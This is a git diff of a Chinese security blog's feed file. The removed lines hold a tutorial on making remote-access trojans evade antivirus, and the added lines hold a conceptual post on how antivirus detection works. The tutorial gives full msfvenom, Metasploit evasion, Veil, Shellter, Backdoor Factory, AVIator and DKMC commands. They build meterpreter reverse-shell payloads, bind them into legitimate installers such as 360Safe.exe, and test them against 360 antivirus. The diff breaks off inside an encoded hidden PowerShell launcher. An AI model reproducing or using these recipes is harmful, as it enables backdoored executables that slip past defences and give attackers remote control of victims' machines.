+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>sqlmap作为一款强大的sql注入工具效率远远高于纯手工注入，再根据实际渗透的场景来编写tamper，两者结合使用可以节约很多时间</p>
+]]></content>
+      <tags>
+        <tag>sqlmap</tag>
+        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -1207,361 +1207,89 @@
       </tags>
   </entry>
   <entry>
-    <title>远控免杀——工具篇</title>
-    <url>/2022/02/15/%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E2%80%94%E2%80%94%E5%B7%A5%E5%85%B7%E7%AF%87/</url>
-    <content><![CDATA[<h1 id="远控免杀——工具篇"><a href="#远控免杀——工具篇" class="headerlink" title="远控免杀——工具篇"></a>远控免杀——工具篇</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>免杀对个人而言是一个熟悉又陌生的概念，之前只知道msf上进行简单的encode来免杀，现在还是从基本的工具开始学起</p>
-<p>实验环境采用Kali+Win7虚拟机，测试机安装360全家桶</p>
+    <title>远控免杀——概念</title>
+    <url>/2022/02/06/%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E2%80%94%E2%80%94%E6%A6%82%E5%BF%B5/</url>
+    <content><![CDATA[<h1 id="远控免杀——概念"><a href="#远控免杀——概念" class="headerlink" title="远控免杀——概念"></a>远控免杀——概念</h1><h2 id="免杀概念"><a href="#免杀概念" class="headerlink" title="免杀概念"></a>免杀概念</h2><p><em>免杀</em>技术全称为反杀毒技术Anti Anti- Virus简称“<em>免杀</em>”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术</p>
 <span id="more"></span>
 
-<h2 id="msf自带免杀"><a href="#msf自带免杀" class="headerlink" title="msf自带免杀"></a>msf自带免杀</h2><h3 id="原始payload"><a href="#原始payload" class="headerlink" title="原始payload"></a>原始payload</h3><p>直接用msfvenom生成原始payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.221.128 LPORT=4444 -f exe -o payload1.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210193805172.png" alt="image-20220210193805172"></p>
-<p>360静态动态均可查杀</p>
-<h3 id="编码处理"><a href="#编码处理" class="headerlink" title="编码处理"></a>编码处理</h3><p>评级最⾼的两个encoder为<code>cmd/powershell_base64</code>和 <code>x86/shikata_ga_nai</code></p>
-<p>编码次数为15并去掉空字符</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.221.128 LPORT=4444 -e x86/shikata_ga_nai -b &quot;\x00&quot; -i 15 -f exe -o payload2.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210201725861.png" alt="image-20220210201725861"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210201847245.png" alt="image-20220210201847245"></p>
-<p>360静态动态均可查杀</p>
-<h3 id="捆绑"><a href="#捆绑" class="headerlink" title="捆绑"></a>捆绑</h3><p>使用msfvenom中的<code>-x</code>参数可以指定一个可执行文件作为模板，将payload嵌入其中，<code>-x</code> 指定文件路径</p>
-<p>我这里捆绑的是360安全卫士</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.221.128 LPORT=4444 -x 360Safe.exe -f exe -o payload3.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210202657179.png" alt="image-20220210202657179"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210202821265.png" alt="image-20220210202821265"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210202853855.png" alt="image-20220210202853855"></p>
-<p>360安全卫士静态没扫出来，360杀毒静态查杀，动态均查杀</p>
-<h3 id="捆绑-编码"><a href="#捆绑-编码" class="headerlink" title="捆绑+编码"></a>捆绑+编码</h3><p>上面两种方法的结合</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.221.128 LPORT=4444 -e x86/shikata_ga_nai -x 360Safe.exe -i 15 -f exe -o payload4.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210203326937.png" alt="image-20220210203326937"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210203539659.png" alt="image-20220210203539659"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210203553483.png" alt="image-20220210203553483"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210203627448.png" alt="image-20220210203627448"></p>
-<p>360全家桶静态均可过，动态均查杀</p>
-<h3 id="多重编码-捆绑"><a href="#多重编码-捆绑" class="headerlink" title="多重编码+捆绑"></a>多重编码+捆绑</h3><p>通过管道符，让msfvenom用不同的编码器反复进行编码混淆</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=192.168.221.128 LPORT=4444 -f raw | msfvenom -a x86 --platform windows -e x86/alpha_upper -i 10 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 10 -x 360Safe.exe -f exe &gt; payload5.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210205818844.png" alt="image-20220210205818844"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210205930063.png" alt="image-20220210205930063"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220210210357725.png" alt="image-20220210210357725"></p>
-<p>360全家桶完全没反应？！</p>
-<h3 id="Evasion模块"><a href="#Evasion模块" class="headerlink" title="Evasion模块"></a>Evasion模块</h3><p>metasploit 5.0引入的一个新模块</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211154339417.png" alt="image-20220211154339417"></p>
-<h4 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use evasion/windows/windows_defender_exe</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set filename payload6.exe</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set lhost 192.168.221.128</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set lport 4444</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; run</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211154547017.png" alt="image-20220211154547017"></p>
-<p>监听</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler -H 192.168.221.128 -P 4444 -p windows/meterpreter/reverse_tcp</span><br><span class="line">jobs</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211154144937.png" alt="image-20220211154144937"></p>
-<p>还没扫描就被删除了</p>
-<h4 id="hta"><a href="#hta" class="headerlink" title="hta"></a>hta</h4><p>用<code>evasion/windows/windows_defender_js_hta</code>模块生成payload</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211155757515.png" alt="image-20220211155757515"></p>
-<p>360杀毒静态可查杀</p>
-<h4 id="install-util"><a href="#install-util" class="headerlink" title="install_util"></a>install_util</h4><p>用<code>evasion/windows/applocker_evasion_install_util</code>模块生成payload</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211171158049.png" alt="image-20220211171158049"></p>
-<p>使用<code>csc.exe</code>进行编译后用<code>InstallUtil.exe</code>加载文件</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211170422141.png" alt="image-20220211170422141"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe</span><br></pre></td></tr></table></figure>
-
-<p>360动态可查杀</p>
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>MSF在被各大安全厂商盯这么紧的情况下，<code>多重编码＋捆绑</code>的方式能免杀成功还是出乎意料的</p>
-<h2 id="Veil"><a href="#Veil" class="headerlink" title="Veil"></a>Veil</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>为了方便直接拉取veil镜像</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull mattiasohlsson/veil</span><br></pre></td></tr></table></figure>
-
-<p>拉取成功，执行如下命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil</span><br></pre></td></tr></table></figure>
-
-<p>将Kali的<code>/tmp/veil-output</code>目录映射到docker里面，这样Veil生成的payload可以直接在kali里使用</p>
-<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>Veil有两个免杀工具，Evasion和Ordnance</p>
-<p>Evasion用做文件免杀</p>
-<p>Ordnance生成在Veil-Evasion中使用的shellcode</p>
-<h3 id="exe-1"><a href="#exe-1" class="headerlink" title="exe"></a>exe</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 1                         //选择Evasionlist                          //查看payload列表use 16                        //go语言生成msf的payloadset lhost 192.168.221.128     set lport 4445generatego_msf                        //生成的payload名称</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211173556181.png" alt="image-20220211173556181"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211174519477.png" alt="image-20220211174519477"></p>
-<p>360静态动态均可查杀</p>
-<h3 id="Veil-mingw-w64"><a href="#Veil-mingw-w64" class="headerlink" title="Veil+mingw-w64"></a>Veil+mingw-w64</h3><p>（待补）</p>
-<h2 id="Venom"><a href="#Venom" class="headerlink" title="Venom"></a>Venom</h2><p>（安装出问题，待补）</p>
-<h2 id="Shellter"><a href="#Shellter" class="headerlink" title="Shellter"></a>Shellter</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>某些版本的Kali自带，没有的可以自行安装，安装过程中不会出现特别坑爹的问题，比较友好</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install shellter</span><br></pre></td></tr></table></figure>
-
-<p>运行报错，有提示</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</span><br></pre></td></tr></table></figure>
-
-<p>安装完毕</p>
-<h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p>准备一个pe文件<code>npp.exe</code>，之后Shellter会备份该pe文件，因为生成的payload会覆盖原来的<code>npp.exe</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211210737098.png" alt="image-20220211210737098"></p>
-<p>接下来根据情况来选择即可，我选的<code>windows/meterpreter/reverse_tcp</code></p>
-<p>中间有个<code>Enable Stealth Mode</code>，是否使用隐身模式，特意做了两种来尝试</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211195832317.png" alt="image-20220211195832317"></p>
-<p>选择隐身模式生成的payload执行后被查杀</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211210316878.png" alt="image-20220211210316878"></p>
-<p>选择非隐身模式生成的payload，成功绕过360！</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220211211221212.png" alt="image-20220211211221212"></p>
-<h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>Shellter使用方便，免杀效果不错。第一次用<code>360Safe.exe</code>生成的payload一直没法监听成功也没有被查杀。搜索了下得用32位的，改用老版本<code>notepad++</code>的安装程序，成功收到meterpreter，对于为啥选择非隐身能绕过360还是不太懂</p>
-<h2 id="BackDoor-Factory"><a href="#BackDoor-Factory" class="headerlink" title="BackDoor-Factory"></a>BackDoor-Factory</h2><p>用户可以在不破坏原有可执行文件的功能的前提下，在文件的代码裂隙中插入shellcode，支持自定义shellcode</p>
-<h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><p>直接拉取docker镜像</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull secretsquirrel/the-backdoor-factory</span><br><span class="line">docker run -it secretsquirrel/the-backdoor-factory bash</span><br><span class="line"># ./backdoor.py</span><br></pre></td></tr></table></figure>
-
-<p>运行成功</p>
-<h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it -v /root/test:/root/payload:z secretsquirrel/the-backdoor-factory</span><br></pre></td></tr></table></figure>
-
-<p>跟Veil使用相似，进行文件夹映射</p>
-<h4 id="程序测试"><a href="#程序测试" class="headerlink" title="程序测试"></a>程序测试</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python backdoor.py -f /root/payload/360Safe.exe -S</span><br></pre></td></tr></table></figure>
-
+<h2 id="杀软检测方式"><a href="#杀软检测方式" class="headerlink" title="杀软检测方式"></a>杀软检测方式</h2><h3 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h3><ol>
+<li>扫描压缩包：对压缩包和封装文件作分析检测</li>
+<li>程序篡改防护：避免恶意程序通过篡改删除杀毒侦测程序从而破坏电脑</li>
+<li>修复技术：对被恶意程序损坏的文件进行还原</li>
+<li>急救盘杀毒：利用空白U盘制作急救启动盘来检测电脑病毒</li>
+<li>智能扫描：扫描检测常用磁盘、系统关键位置，耗时较短</li>
+<li>全盘扫描：扫描全部磁盘，耗时较长</li>
+<li>勒索软件防护：保护电脑中的文件不被恶意加密</li>
+<li>开机扫描：开机自动扫描，扫描压缩文档和可能不需要的程序</li>
+</ol>
+<h3 id="监控技术"><a href="#监控技术" class="headerlink" title="监控技术"></a>监控技术</h3><ol>
+<li>内存监控：发现内存中存在病毒并主动报警；监控所有进程；监控读取到内存中的文件；监控读取到内存中的网络数据</li>
+<li>文件监控：发现写到磁盘上的文件中存在病毒或者被病毒感染，主动报警</li>
+<li>邮件监控：电子邮件的附件中存在病毒时进行拦截</li>
+<li>网页防护：阻止网络攻击和不安全的下载行为</li>
+<li>行为防护：警示用户应用程序的可疑行为</li>
+</ol>
+<h3 id="扫描引擎"><a href="#扫描引擎" class="headerlink" title="扫描引擎"></a>扫描引擎</h3><h4 id="特征码扫描"><a href="#特征码扫描" class="headerlink" title="特征码扫描"></a>特征码扫描</h4><p>特征码扫描是传统杀毒软件的主要利器，是病毒诊断方法中，扫描法的一种。将扫描信息与病毒特征库进行对照，信息与病毒特征吻合的文件会被判断为存在病毒。病毒的特征码一般是文件内部的一段或者几段代码，特殊性在于不大可能与正常程序代码吻合。抽取的代码长度要适当，保证特征码唯一性的同时缩减病毒扫描的空间与时间开销</p>
 <blockquote>
-<p>-f: 指定被测试程序</p>
-<p>-S: 检查程序是否可被利用</p>
+<p>特征码：能识别一个程序是一个病毒的一段不大于64字节的特征串</p>
 </blockquote>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212125645235.png" alt="image-20220212125645235"></p>
-<p>检查exe是否能插入shellcode</p>
-<h4 id="搜索Code-Caves"><a href="#搜索Code-Caves" class="headerlink" title="搜索Code Caves"></a>搜索Code Caves</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python backdoor.py -f /root/payload/360Safe.exe -c -l 600</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>-c: 查找Code Cave</p>
-<p>-l: Code Cave Size，用于插入shellcode</p>
-</blockquote>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212130536451.png" alt="image-20220212130536451"></p>
-<p>找到了5个可利用点</p>
-<h4 id="获取payload"><a href="#获取payload" class="headerlink" title="获取payload"></a>获取payload</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python backdoor.py -f /root/payload/360Safe.exe -s -show</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212130803057.png" alt="image-20220212130803057"></p>
-<blockquote>
+<p><strong>特征码类别：</strong></p>
 <ol>
-<li>reverse_shell_tcp_inline ：对应msf： use exploit/multi/handlerset</li>
+<li>文件特征码：单一文件特征码、复合文件特征码（通过多处特征进行判断）。针对<strong>文件病毒</strong></li>
+<li>内存特征码：单一内存特征码、复合内存特征码。针对<strong>内存病毒</strong></li>
 </ol>
-<p>payload windows/meterpreter/reverse_tcp</p>
-<ol start="2">
-<li>meterpreter_reverse_https_threaded ：对应msf： use</li>
-</ol>
-<p>exploit/multi/handlerset payload windows/meterpreter/reverse_https</p>
-<ol start="3">
-<li>iat_reverse_tcp_inline : 增加了修复IAT的功能，避免reverse_shell_tcp_inline执⾏失败</li>
-<li>iat_reverse_tcp_stager_threaded : 功能类似上一条</li>
-<li>user_supplied_shellcode_threaded ：对应的msf： use</li>
-</ol>
-<p>exploit/multi/handlerset payload windows/meterpreter/reverse_tcp``⾃定义</p>
-<p>shellcode</p>
-</blockquote>
-<h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python backdoor.py -f /root/payload/360Safe.exe -s iat_reverse_tcp_stager_threaded -H 192.168.221.128 -P 4444 -J -o payload8.exe</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>-J: 选择多个Code Cave注入 </p>
-</blockquote>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212140152504.png" alt="image-20220212140152504"></p>
-<p>360动静态均可查杀</p>
-<h3 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h3><p>缝隙插入代码的想法比较有意思，但是免杀效果经测试不太行</p>
-<h2 id="Avet"><a href="#Avet" class="headerlink" title="Avet"></a>Avet</h2><p>（装了近3个小时没法用，心态崩了）</p>
-<h2 id="TheFatRat"><a href="#TheFatRat" class="headerlink" title="TheFatRat"></a>TheFatRat</h2><p>（待补）</p>
-<h2 id="Avoidz"><a href="#Avoidz" class="headerlink" title="Avoidz"></a>Avoidz</h2><p>（安装出错，待补）</p>
-<h2 id="Green-Hat-Suite"><a href="#Green-Hat-Suite" class="headerlink" title="Green-Hat-Suite"></a>Green-Hat-Suite</h2><p>（待补）</p>
-<h2 id="zirikatu"><a href="#zirikatu" class="headerlink" title="zirikatu"></a>zirikatu</h2><p>zirikatu利用msfvenom生成shellcode，再进行后续处理并生成exe</p>
-<h3 id="安装-3"><a href="#安装-3" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x zirikatu.sh</span><br><span class="line">./zirikatu.sh</span><br></pre></td></tr></table></figure>
-
-<p>运行成功</p>
-<h3 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212180240192.png" alt="image-20220212180240192"></p>
-<p>zirikatu可以修改图标，增加错误提示，监听等功能</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212180215659.png" alt="image-20220212180215659"></p>
-<p>360静态可查杀</p>
-<h3 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h3><p>网上看到的文章中这个操作简单体量小的工具居然能免杀360火绒，测试后静态查杀就翻车了，这个工具也挺老了后续没有更新，可惜</p>
-<h2 id="AVIator"><a href="#AVIator" class="headerlink" title="AVIator"></a>AVIator</h2><p>AVIator使⽤AES加密来加密给定的Shellcode加密，⽣成⼀个包含加密有效负载的可</p>
-<p>执⾏⽂件，然后使⽤各种注⼊技术将shellcode解密并注⼊到⽬标系统，从⽽绕过杀</p>
-<p>毒软件的检测</p>
-<p>只支持windows，C#开发</p>
-<h3 id="安装-4"><a href="#安装-4" class="headerlink" title="安装"></a>安装</h3><p>直接下载压缩包</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/Ch0pin/AVIator</span><br></pre></td></tr></table></figure>
-
-<p>解压运行exe即可</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212181426434.png" alt="image-20220212181426434"></p>
-<h3 id="使用-4"><a href="#使用-4" class="headerlink" title="使用"></a>使用</h3><p>用msf生成基于C#的shellcode</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.221.128 LPORT=4444 -f csharp -o payload11.c</span><br></pre></td></tr></table></figure>
-
-<p>复制<code>payload11.c</code>中{}内的内容到payload，加密生成新payload</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212182138145.png" alt="image-20220212182138145"></p>
-<p><code>Select path</code>选择存放路径</p>
-<p><code>Injection Techniques</code>选择注入技术，这里用了第二个注入Notepad++</p>
-<p><code>Generate Exe</code>生成可执行文件</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212183258116.png" alt="image-20220212183258116"></p>
-<p>360全家桶第一次静态查杀没有反应，但是过了一会就被360杀毒删除隔离了</p>
-<p>动态直接被查杀</p>
-<h3 id="小结-4"><a href="#小结-4" class="headerlink" title="小结"></a>小结</h3><p>工具简单，使用便捷。免杀效果不如以前了，作者官方说明文件中也说了，随着工具的流行，工具也长期没有更新，效果确实越来越差了。但是作者提出了一种思路，就是对生成的可执行文件使用C#混淆器，后续可以尝试下</p>
-<h2 id="DKMC"><a href="#DKMC" class="headerlink" title="DKMC"></a>DKMC</h2><p>DKMC是⼀种⽣成混淆的shellcode的⼯具，并把shellcode合成到图像⽂件中，最终依靠PowerShell执⾏最终的shellcode</p>
-<h3 id="安装-5"><a href="#安装-5" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Mr-Un1k0d3r/DKMC</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用-5"><a href="#使用-5" class="headerlink" title="使用"></a>使用</h3><p><code>python dkmc.py</code>运行DKMC，参数解释</p>
-<blockquote>
-<p>[*] (gen) 将msf的shellcode注入到一个BMP图像</p>
-<p>[*] (web) 启动web服务用来分发BMP图像</p>
-<p>[*] (ps) 生成ps的payload</p>
-<p>[*] (sc) 将msf生成的raw文件转为shellcode</p>
-<p>[*] (exit) 退出</p>
-</blockquote>
-<p>执行流程如下：</p>
+<p>优点：速度快；准确率相对较高，误杀操作较少；基本不需要用户参与判断</p>
+<p>缺点：采用病毒特征代码检测，面对不断出现的新型病毒需要不断更新病毒库，否则检测工具的老化会失去使用价值；病毒特征代码检测无法对不知道特征码的新病毒进行检测；病毒特征码本身有问题可能会出现误报，数据误删</p>
+<h4 id="文件校验和"><a href="#文件校验和" class="headerlink" title="文件校验和"></a>文件校验和</h4><p>对文件扫描后，计算正常文件内容的校验和，将校验和写入文件中或写入别的文件保存；定期或每次在使用文件前，检查文件现在内容算出的校验和与原来保存的校验和是否一致，从而判断文件是否被感染</p>
+<p>优点：方法简单；可发现未知病毒；能发现文件细微变化</p>
+<p>缺点：误报率高；效率低；不能识别病毒</p>
+<h4 id="行为检测"><a href="#行为检测" class="headerlink" title="行为检测"></a>行为检测</h4><p>通过长期观察研究总结病毒的特殊行为，并且这些行为在正常程序行为中比较罕见。当程序运行时，监视进程的各种行为，发现病毒行为，立即报警。</p>
+<p>优点：可发现未知病毒；可准确预报未知的大多病毒</p>
+<p>缺点：可能误报；不能识别病毒；需要用户参与判断</p>
+<h4 id="主动防御"><a href="#主动防御" class="headerlink" title="主动防御"></a>主动防御</h4><p>不需要病毒特征码支持，杀软自行分析扫描目标程序的行为，根据预先设定的规则进行主动的病毒判断清除等操作。</p>
+<p>实现难度较高，计算机智能也是在一系列规则下诞生的，该技术还需要不断的研究进步</p>
+<h4 id="机器学习识别"><a href="#机器学习识别" class="headerlink" title="机器学习识别"></a>机器学习识别</h4><p>既可以做静态样本的二进制分析，又可以运行在沙箱动态行为分析中，内容/行为+算法模式。随着深度学习的发展，运用深度学习技术来识别病毒特征</p>
+<h2 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a>免杀技术</h2><p>免杀技术最基本思想就是破坏病毒木马本身的特征，可以是特征码，也可以是行为特征，破坏其固有特征并保留其原有功能</p>
+<h3 id="修改特征码"><a href="#修改特征码" class="headerlink" title="修改特征码"></a>修改特征码</h3><h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><p>特征码定位到数据位置不容易修改</p>
 <ol>
-<li>用msf生成raw文件</li>
-<li>将msf生成的raw文件转为shellcode</li>
-<li>将shellcode注入到BMP图像中</li>
-<li>生成powershell payload</li>
-<li>用web服务分发BMP文件</li>
+<li>字符串，如果不影响程序逻辑，可替换大小写；无关紧要的数据，随意替换</li>
+<li>整数，如果不影响结果，可替换值或清零等</li>
+<li>地址，基本不能修改，具体看情况</li>
+<li>PE头数据，无用数据清零或修改，有用数据具体情况具体分析</li>
+<li>直接修改代码访问数据的地址，数据放到其他地址</li>
 </ol>
-<h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.221.128 LPORT=4444 -e x86/shikata_ga_nai -b &quot;\x00&quot; -i 5 -a x86 -f raw -o /root/桌面/payload/payload12.raw</span><br></pre></td></tr></table></figure>
-
-<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p><code>sc</code>设置``source为上一步生成的<code>payload12.raw</code>，生成shellcode，复制并<code>exit</code>返回主菜单</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212202336610.png" alt="image-20220212202336610"></p>
-<h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><p><code>gen</code>设置shellcode为上一步中复制的内容，生成bmp并<code>exit</code>返回主菜单</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212202635077.png" alt="image-20220212202635077"></p>
-<h4 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h4><p><code>ps</code>设置url为Kali地址，执行生成powershell脚本，复制脚本并<code>exit</code>返回主菜单</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212203218057.png" alt="image-20220212203218057"></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-enc</span> JABIAGEAcABiAEwAUgB0AFQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBDAEcAdQBvAEIAMgBJAEMALwB6AEUAMgBOAEQAUQAyAE4AagBrAHcATQB6AFUAdQBNAHoAWQAhAHYAVgBaAGQAVAArAE0ANABGAEgAMQBIADQAagA5AFkAbwAwAGgASgBwAEQAUwAwAEIAYgBFAHMAMABrAGkAVQBGAG8AYQBPAEsASABRAEkAUQA5AEYAMABxAHAARwBiADMARABZAGUAbgBEAGcANABUAHEARQBNAC8AUABlADkAegBnAGMAcABvAHUAeQB3AHUAOQBMAG0ASgBZAGwAOQByADMAMQA5AHoAdgBHAHgAagBTAC8AegBIAHIAMABtAEgAOABtAEIAdQBiAGsAeAB5ADIASgBmAE0AUgBHAFQAVwArADkAYQBmAGcAdABaAGQARQBwACsAYgBXADYAUQA4AGgAbABTAFMAUwBOAGkARwBRAHMAcQBmADAAUQBpAHkARABnADQASgBQADkASgBwAFAAIQBoAHkAQwBUAFkAZABiACEAeABEAFUALwBTADYAeABnAEgAdABzAGEAZABKAE8AbQBKAGkATABKADQAcwByAC8AZgB6AGEAUwBFAFcAQgBYAC8ANwBpAGQAUQBuAFQAUwBGAGEATQBvAFoAcABKAFoATgBIAHMAawBvAEIAIQBtAE4AOAArAGwAUAA4AEIAWAA1AFIAWQB3AGYANwBpAGMAdQBwAHAAUwBYAFkAYwBzAHUAOQBVAE0AZwBqAFUANABjADYATAA1AFQANABWAE4AZABzAE8AcwBsAG4AQwBuAEwALwBQADcAZAB0AE0AZQBOADEAcwBRADkAdQBzADAAbwBUAHkAMwBUAFcANgBZAEsASQBqAGY